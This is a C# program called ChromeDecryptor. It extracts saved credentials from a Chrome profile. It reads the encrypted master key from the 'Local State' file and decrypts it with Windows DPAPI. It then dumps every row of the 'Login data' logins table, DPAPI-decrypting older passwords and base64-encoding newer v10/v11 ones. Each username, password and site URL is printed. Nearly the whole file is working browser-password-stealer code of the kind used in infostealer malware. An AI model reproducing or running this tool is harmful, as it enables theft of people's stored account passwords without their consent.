using System;
using System.IO;
using System.Text;
using ChromeDecryptor.Utilities;

namespace ChromeDecryptor
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine(GetMaster());
            ReadDB("Login data");

        }

        static string rawpass;
        static string b64pass;
        static string username;
        static string siteurl;
        
        public static void ReadDB(string DBfile)
        {
            SQLite sqlite = new SQLite(DBfile);
            sqlite.ReadTable("logins");
            Console.WriteLine("username\t\tpassword\t\turl");
            Console.WriteLine("=================================================");

            for (int i = 0; i < sqlite.GetRowCount(); i++)
            {
                
                siteurl = sqlite.GetValue(i, 0);
                username = sqlite.GetValue(i, 3);
                rawpass = sqlite.GetValue(i, 5);

                if (rawpass.StartsWith("v10") || rawpass.StartsWith("v11"))
                    b64pass = "ENC_"+Convert.ToBase64String(Encoding.Default.GetBytes(rawpass));
                else
                {
                    b64pass = Encoding.Default.GetString(DPAPI.Decrypt(Encoding.Default.GetBytes(rawpass)));
                }
                Console.WriteLine(username+":"+ b64pass +":"+siteurl);
                Console.WriteLine();

               

           



            }

        }
        public static string GetMaster()
        {
            string key;

            string json = File.ReadAllText("local state");

            int lindex;
            int findex = json.IndexOf("os_crypt");
            findex = json.IndexOf("encrypted_key", findex);
            findex = json.IndexOf(':', findex);
            findex = json.IndexOf('"', findex) + 1;

            lindex = json.IndexOf('"', findex + 2);

            key = json.Substring(findex, lindex - findex);
            byte[] key_bytes = Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(key)).Remove(0, 5));
            byte[] masterKeyBytes = DPAPI.Decrypt(key_bytes);
            return Convert.ToBase64String(masterKeyBytes);

        }
    }
}
